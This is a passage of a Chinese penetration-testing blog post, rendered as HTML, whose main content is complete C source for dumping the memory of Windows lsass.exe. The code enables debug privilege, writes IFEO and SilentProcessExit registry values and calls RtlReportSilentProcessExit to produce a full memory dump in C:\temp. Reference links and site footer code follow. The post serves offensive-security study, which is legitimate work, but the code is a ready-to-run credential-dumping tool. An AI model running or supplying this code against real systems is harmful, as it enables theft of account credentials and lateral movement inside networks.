class="hljs-meta-string">L&quot;C:\\temp&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MiniDumpWithFullMemory 0x2</span><br> <br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI * fRtlReportSilentProcessExit)</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    HANDLE processHandle,</span></span><br><span class="hljs-function"><span class="hljs-params">    NTSTATUS ExitStatus</span></span><br><span class="hljs-function"><span class="hljs-params">    )</span></span>;<br> <br><span class="hljs-function">BOOL <span class="hljs-title">EnableDebugPriv</span><span class="hljs-params">()</span> </span>&#123;<br>    HANDLE hToken = <span class="hljs-literal">NULL</span>;<br>    LUID luid;<br> <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 获取当前进程Token失败 %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;luid)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - Lookup SE_DEBUG_NAME失败 %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    TOKEN_PRIVILEGES tokenPriv;<br>    tokenPriv.PrivilegeCount = <span class="hljs-number">1</span>;<br>    tokenPriv.Privileges[<span class="hljs-number">0</span>].Luid = luid;<br>    tokenPriv.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br> <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tokenPriv, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(tokenPriv), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - AdjustTokenPrivileges 失败: %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br> <br><span class="hljs-function">BOOL <span class="hljs-title">setRelatedRegs</span><span class="hljs-params">(PCWCHAR procName)</span> </span>&#123;<br> <br>    HKEY hkResSubIFEO = <span class="hljs-literal">NULL</span>;<br>    HKEY hkResSubSPE = <span class="hljs-literal">NULL</span>;<br>    DWORD globalFlag = FLG_MONITOR_SILENT_PROCESS_EXIT;<br>    DWORD reportingMode = MiniDumpWithFullMemory;<br>    DWORD dumpType = LOCAL_DUMP, retstatus = <span class="hljs-number">-1</span>;<br> <br>    BOOL ret = FALSE;<br> <br>    PWCHAR subkeyIFEO = (PWCHAR)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">lstrlenW</span>(IFEO_REG_KEY)*<span class="hljs-number">2</span> + <span class="hljs-built_in">lstrlenW</span>(procName)*<span class="hljs-number">2</span> + <span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">wsprintf</span>(subkeyIFEO, <span class="hljs-string">L&quot;%ws%ws&quot;</span>, IFEO_REG_KEY, procName);<br>    PWCHAR subkeySPE = (PWCHAR)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">lstrlenW</span>(SILENT_PROCESS_EXIT_REG_KEY)*<span class="hljs-number">2</span> + <span class="hljs-built_in">lstrlenW</span>(procName)*<span class="hljs-number">2</span> + <span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">wsprintf</span>(subkeySPE, <span class="hljs-string">L&quot;%ws%ws&quot;</span>, SILENT_PROCESS_EXIT_REG_KEY, procName);<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - [DEBUGPRINT] Image_File_Execution_Options: %ws\n&quot;</span>, subkeyIFEO);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - [DEBUGPRINT] SilentProcessExit: %ws\n&quot;</span>, subkeySPE);<br> <br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">// 设置 Image File Execution Options\&lt;ProcessName&gt; 下GlobalFlag键值为0x200</span><br>        <span class="hljs-keyword">if</span> (ERROR_SUCCESS != (retstatus = <span class="hljs-built_in">RegCreateKey</span>(HKEY_LOCAL_MACHINE, subkeyIFEO, &amp;hkResSubIFEO))) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 打开注册表项 Image_File_Execution_Options 失败: %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ERROR_SUCCESS != (retstatus = <span class="hljs-built_in">RegSetValueEx</span>(hkResSubIFEO, <span class="hljs-string">L&quot;GlobalFlag&quot;</span>, <span class="hljs-number">0</span>, REG_DWORD, (<span class="hljs-keyword">const</span> BYTE*)&amp;globalFlag, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(globalFlag)))) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 设置注册表键 GlobalFlag 键值失败: %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br> <br>        <span class="hljs-comment">// 设置 SilentProcessExit\&lt;ProcessName&gt; 下 ReporingMode/LocalDumpFolder/DumpType 三个值</span><br>        <span class="hljs-keyword">if</span> (ERROR_SUCCESS != (retstatus = <span class="hljs-built_in">RegCreateKey</span>(HKEY_LOCAL_MACHINE, subkeySPE, &amp;hkResSubSPE))) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 打开注册表项 SilentProcessExit 失败: %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ERROR_SUCCESS != (retstatus = <span class="hljs-built_in">RegSetValueEx</span>(hkResSubSPE, <span class="hljs-string">L&quot;ReportingMode&quot;</span>, <span class="hljs-number">0</span>, REG_DWORD, (<span class="hljs-keyword">const</span> BYTE*)&amp;reportingMode, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(reportingMode)))<br>            || ERROR_SUCCESS != (retstatus = <span class="hljs-built_in">RegSetValueEx</span>(hkResSubSPE, <span class="hljs-string">L&quot;LocalDumpFolder&quot;</span>, <span class="hljs-number">0</span>, REG_SZ, (<span class="hljs-keyword">const</span> BYTE*)DUMP_FOLDER, <span class="hljs-built_in">lstrlenW</span>(DUMP_FOLDER)*<span class="hljs-number">2</span>))<br>            || ERROR_SUCCESS != (retstatus = <span class="hljs-built_in">RegSetValueEx</span>(hkResSubSPE, <span class="hljs-string">L&quot;DumpType&quot;</span>, <span class="hljs-number">0</span>, REG_DWORD, (<span class="hljs-keyword">const</span> BYTE*)&amp;dumpType, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(dumpType)))) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 设置注册表键 reportingMode|LocalDumpFolder|DumpType 键值失败: %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 注册表设置完成 ...\n&quot;</span>);<br>        ret = TRUE;<br> <br>    &#125; <span class="hljs-keyword">while</span> (FALSE);<br> <br>    <span class="hljs-built_in">free</span>(subkeyIFEO);<br>    <span class="hljs-built_in">free</span>(subkeySPE);<br>    <span class="hljs-keyword">if</span> (hkResSubIFEO)<br>        <span class="hljs-built_in">CloseHandle</span>(hkResSubIFEO);<br>    <span class="hljs-keyword">if</span> (hkResSubSPE)<br>        <span class="hljs-built_in">CloseHandle</span>(hkResSubSPE);<br> <br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br> <br><span class="hljs-function">DWORD <span class="hljs-title">getPidByName</span><span class="hljs-params">(PCWCHAR procName)</span> </span>&#123;<br> <br>    HANDLE hProcSnapshot;<br>    DWORD retPid = <span class="hljs-number">-1</span>;<br>    hProcSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    PROCESSENTRY32W pe;<br> <br>    <span class="hljs-keyword">if</span> (INVALID_HANDLE_VALUE == hProcSnapshot) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 创建快照失败!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    pe.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(PROCESSENTRY32W);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Process32First</span>(hProcSnapshot, &amp;pe)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - Process32First Error : %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">lstrcmpiW</span>(procName, <span class="hljs-built_in">PathFindFileName</span>(pe.szExeFile))) &#123;<br>            retPid = pe.th32ProcessID;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(hProcSnapshot, &amp;pe));<br>    <span class="hljs-built_in">CloseHandle</span>(hProcSnapshot);<br>    <span class="hljs-keyword">return</span> retPid;<br>&#125;<br> <br><span class="hljs-function">INT <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br> <br>    PCWCHAR targetProcName = <span class="hljs-string">L&quot;lsass.exe&quot;</span>;<br>    DWORD pid = <span class="hljs-number">-1</span>;<br>    HMODULE hNtMod = <span class="hljs-literal">NULL</span>;<br>    fRtlReportSilentProcessExit fnRtlReportSilentProcessExit = <span class="hljs-literal">NULL</span>;<br>    HANDLE hLsassProc = <span class="hljs-literal">NULL</span>;<br>    NTSTATUS ntStatus = <span class="hljs-number">-1</span>;<br> <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">EnableDebugPriv</span>()) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 启用当前进程DEBUG权限失败: %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 启用当前进程DEBUG权限 OK\n&quot;</span>);<br> <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">setRelatedRegs</span>(targetProcName)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 设置相关注册表键值失败: %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 设置相关注册表键值 OK\n&quot;</span>);<br> <br>    pid = <span class="hljs-built_in">getPidByName</span>(targetProcName);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">-1</span> == pid) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 获取目标进程pid: %#X\n&quot;</span>, pid);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 获取目标PID: %#X\n&quot;</span>, pid);<br> <br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        hNtMod = <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!hNtMod) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 获取NTDLL模块句柄失败\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - NTDLL模块句柄: %#X\n&quot;</span>, (DWORD)hNtMod);<br>        fnRtlReportSilentProcessExit = (fRtlReportSilentProcessExit)<span class="hljs-built_in">GetProcAddress</span>(hNtMod, <span class="hljs-string">&quot;RtlReportSilentProcessExit&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!fnRtlReportSilentProcessExit) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 获取API RtlReportSilentProcessExit地址失败\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - RtlReportSilentProcessExit地址: %#X\n&quot;</span>, (DWORD)fnRtlReportSilentProcessExit);<br>        hLsassProc = <span class="hljs-built_in">OpenProcess</span>(PROCESS_QUERY_LIMITED_INFORMATION|PROCESS_VM_READ, <span class="hljs-number">0</span>, pid);<br>        <span class="hljs-keyword">if</span> (!hLsassProc) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 获取lsass进程句柄失败: %#X\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 获取lsass进程句柄: %#X\n&quot;</span>, (DWORD)hLsassProc);<br> <br>        ntStatus = <span class="hljs-built_in">fnRtlReportSilentProcessExit</span>(hLsassProc, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; - 结束,查看c:\\temp\\lsass*.dmp...RET CODE : %#X\n&quot;</span>, (DWORD)ntStatus);<br> <br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">false</span>);<br> <br>    <span class="hljs-keyword">if</span> (hNtMod) <br>        <span class="hljs-built_in">CloseHandle</span>(hNtMod);<br>    <span class="hljs-keyword">if</span> (fnRtlReportSilentProcessExit) <br>        <span class="hljs-built_in">CloseHandle</span>(fnRtlReportSilentProcessExit);<br>    <span class="hljs-keyword">if</span> (hLsassProc)<br>        <span class="hljs-built_in">CloseHandle</span>(hLsassProc);<br>    <span class="hljs-keyword">if</span> (fnRtlReportSilentProcessExit)<br>        fnRtlReportSilentProcessExit = <span class="hljs-literal">NULL</span>;<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>参考文章<br><a target="_blank" rel="noopener" href="https://lengjibo.github.io/lassdump/">https://lengjibo.github.io/lassdump/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12157#toc-10">https://xz.aliyun.com/t/12157#toc-10</a><br><a target="_blank" rel="noopener" href="https://www.crisprx.top/archives/469">https://www.crisprx.top/archives/469</a><br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E8%BF%9C%E7%A8%8B%E4%BB%8Elsass.exe%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E8%BF%9C%E7%A8%8B%E4%BB%8Elsass.exe%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/226170.html">https://www.freebuf.com/sectool/226170.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12157#toc-4">https://xz.aliyun.com/t/12157#toc-4</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2103172">https://cloud.tencent.com/developer/article/2103172</a><br><a target="_blank" rel="noopener" href="https://mrwu.red/web/2000.html">https://mrwu.red/web/2000.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/02/23/2023-2-23-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">红日靶场2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/18/2023-2-18-Kerberos%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E4%B8%80%E4%B9%8B%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">Kerberos协议相关攻击一之委派攻击学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
